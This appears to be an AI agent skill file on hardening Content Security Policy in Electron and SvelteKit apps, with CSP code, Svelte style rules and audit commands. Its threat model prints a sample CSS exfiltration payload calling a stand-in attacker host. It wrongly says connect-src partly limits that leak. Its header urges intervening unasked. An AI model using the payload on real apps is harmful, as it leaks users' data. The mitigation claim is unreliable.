---
name: electron-svelte-csp
description: |
  Apply whenever working on an Electron + SvelteKit project and any of the following occur:
  (1) setting up or modifying the Content Security Policy (CSP) for the first time,
  (2) writing or reviewing any Svelte component that uses dynamic styles,
  (3) a style="" attribute binding with a template expression appears in a .svelte file,
  (4) someone mentions unsafe-inline, style-src, or CSP in an Electron/Svelte context,
  (5) auditing the security posture of an Electron app.
  Use proactively — if you see a style="" template binding being written in a .svelte file, intervene immediately without waiting to be asked. The goal is zero 'unsafe-inline' from the first commit.
---

# Secure CSP: Electron + SvelteKit + Svelte 5

## The goal

An Electron app using SvelteKit can achieve zero `'unsafe-inline'` in every CSP directive. This is fully achievable with Svelte 5 and `adapter-static`, and costs nothing architecturally. Apply this posture from the first line of code.

---

## The correct CSP

Set in `electron/main/protocols.ts` (or equivalent) via `webRequest.onHeadersReceived`. Inline script hashes are computed at startup from the built HTML because SvelteKit's base-URL script changes content on every build.

```typescript
import { readFileSync } from 'fs';
import { createHash } from 'crypto';

function inlineScriptHashes(indexHtmlPath: string): string[] {
  const html = readFileSync(indexHtmlPath, 'utf8');
  const hashes: string[] = [];
  const re = /<script>([\s\S]*?)<\/script>/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(html)) !== null) {
    const digest = createHash('sha256').update(m[1]).digest('base64');
    hashes.push(`'sha256-${digest}'`);
  }
  return hashes;
}

// Called after app.ready, before loading the window:
const scriptHashes = inlineScriptHashes(path.join(frontendBuildPath, 'index.html'));

const csp = [
  "default-src 'self' app:",
  "connect-src 'self' http://localhost:* app:",       // sidecar API + app:// protocol
  "img-src 'self' app: analecta-file: data: blob: https:",
  "style-src-elem 'self' app:",                       // <style> tags + <link> stylesheets
  "style-src-attr 'none'",                            // block all style="" attribute mutations
  "font-src 'self' app:",
  `script-src 'self' ${scriptHashes.join(' ')} app:`, // SHA-256 per build
  "object-src 'none'",
  "base-uri 'self'",
].join('; ');

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': [csp],
    },
  });
});
```

**Why no hashes are needed for `style-src-elem`:** `adapter-static` + `ssr = false` produces zero inline `<style>` tags in the built HTML — all component CSS becomes external files loaded via `<link>`. After any build, verify with:
```bash
grep 'style' frontend/build/index.html
# Must show only <link href="...css"> — no <style> tags, no style= attributes
```

---

## Why `style-src-attr 'none'` is safe with Svelte 5

CSP Level 3 separates two style-injection mechanisms:

| Mechanism | Governed by CSP? |
|-----------|-----------------|
| `element.setAttribute('style', '...')` | ✅ Yes — blocked by `style-src-attr 'none'` |
| `element.style.cssText = '...'` | ✅ Yes — blocked |
| `element.style.setProperty('color', value)` | ❌ No — CSSStyleDeclaration API, not CSP-governed |
| `element.style.left = '10px'` | ❌ No — same reason |

Svelte's `style:property` directive compiles to `element.style.setProperty()`. This is the correct mechanism.

Svelte 5 built-in transitions (`transition:slide`, `transition:fade`, etc.) use the **Web Animations API** (`element.animate()`), NOT runtime `<style>` tag injection. They are not a blocker for `style-src-elem` without `'unsafe-inline'`. This was verified by reading `svelte/src/internal/client/dom/elements/transitions.js`.

---

## Svelte component rules

**Never write `style=""` with any template expression:**
```svelte
<!-- ❌ compiles to setAttribute('style', ...) — blocked -->
<div style="left: {x}px; top: {y}px">
<span style="color: {sourceColor}">
<input style="font-size: {fontSize}px">
<aside style="--sidebar-width: {$w}px">
```

**Always use `style:property` directives:**
```svelte
<!-- ✅ compiles to element.style.setProperty() — not CSP-governed -->
<div style:left="{x}px" style:top="{y}px">
<span style:color={sourceColor}>
<input style:font-size="{fontSize}px">
<aside style:--sidebar-width="{$w}px">
```

Multiple properties on the same element: one `style:` directive per property.

Values with units are valid strings: `style:font-size="{n}px"`, `style:width="calc({a}px + {b}rem)"`.

CSS variable fallbacks work as expected: `style:color={expr ?? 'var(--fg-muted)'}` — `element.style.setProperty('color', 'var(--fg-muted)')` is valid CSS.

---

## `app.html` wrapper rule

The `app.html` body wrapper must use a CSS class, not a `style=""` attribute:

```html
<!-- ❌ static style="" attribute — blocked by style-src-attr 'none' -->
<div style="display: contents">%sveltekit.body%</div>

<!-- ✅ -->
<div class="app-root">%sveltekit.body%</div>
```

```css
/* app.css */
.app-root { display: contents; }
```

---

## Audit procedure for existing projects

Run these checks in order:

```bash
# 1. Find style="" template bindings in Svelte files
grep -rn 'style="' frontend/src/ --include="*.svelte"
# Every match containing {expression} must be migrated to style: directive

# 2. Check the CSP configuration
grep -n "unsafe-inline\|style-src" electron/main/protocols.ts
# Any 'unsafe-inline' in style-src, style-src-elem, or style-src-attr is a finding

# 3. Check app.html
grep -n 'style=' frontend/src/app.html
# Must be empty

# 4. Verify the built HTML (after pnpm build)
grep 'style' frontend/build/index.html
# Must show only <link> tags — no <style> elements, no style= attributes
```

---

## What not to do

- **Never use the monolithic `style-src 'unsafe-inline'`** — it applies `'unsafe-inline'` to both `<style>` tags and `style=""` attributes and is entirely avoidable.
- **Never add `csp.mode: 'hash'` to `svelte.config.js` to solve this** — it's an SSR mechanism and adds unnecessary build complexity when `ssr = false` already produces hash-free HTML.
- **Never use `npx` / `pnpm dlx` for tools that run with secrets in their `env:`** — that's a supply chain attack surface. See the `audit-ci` skill.
- **`'unsafe-hashes'` is a last resort**, only when a third-party library emits a fixed `style=""` attribute you cannot change. Hash the exact attribute string value; never use it for dynamic values.

---

## The threat model (why this matters in Electron)

`'unsafe-inline'` in `style-src` enables two real attack vectors, given a prior XSS or content-injection in rendered Markdown/HTML:

1. **Attribute-selector exfiltration** — CSS like `input[value^="a"] { background-image: url(http://attacker/?c=a) }` leaks DOM content character-by-character. Mitigated partially by `connect-src` restricting outbound requests, but not completely if localhost endpoints exist.

2. **UI redressing** — In a desktop vault app, injected CSS can hide security controls, overlay fake authentication prompts, or reorder buttons to induce unintended clicks. `contextIsolation: true` prevents JS execution but not style manipulation.

The risk is lower than `script-src 'unsafe-inline'` because CSS cannot call `window.electronAPI`. But it is not zero, and the elimination path costs nothing in this stack.
